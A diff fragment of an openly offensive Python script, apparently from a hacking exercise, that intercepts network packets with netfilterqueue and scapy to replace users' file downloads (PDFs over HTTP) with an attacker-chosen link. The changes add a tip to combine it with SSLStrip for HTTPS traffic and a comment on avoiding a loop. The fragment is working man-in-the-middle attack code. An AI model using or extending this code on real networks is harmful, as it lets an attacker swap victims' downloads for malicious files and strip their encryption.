@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
-"""Download replacer that redirects it to a custom link (not working for HTTPS)"""
+"""Download replacer that redirects it to a custom link (not working for HTTPS)
+Use SSLStrip to use for https, SSLStrip works in port 10000
+"""
 
 import netfilterqueue
 import scapy.all as scapy
@@ -27,7 +29,7 @@ def process_packet(packet):
 
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 80: # and not second argument of set_load, otherwise will do infinite loop
             if b".pdf" in scapy_packet[scapy.TCP].load:
                 print("Downloading a pdf!")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
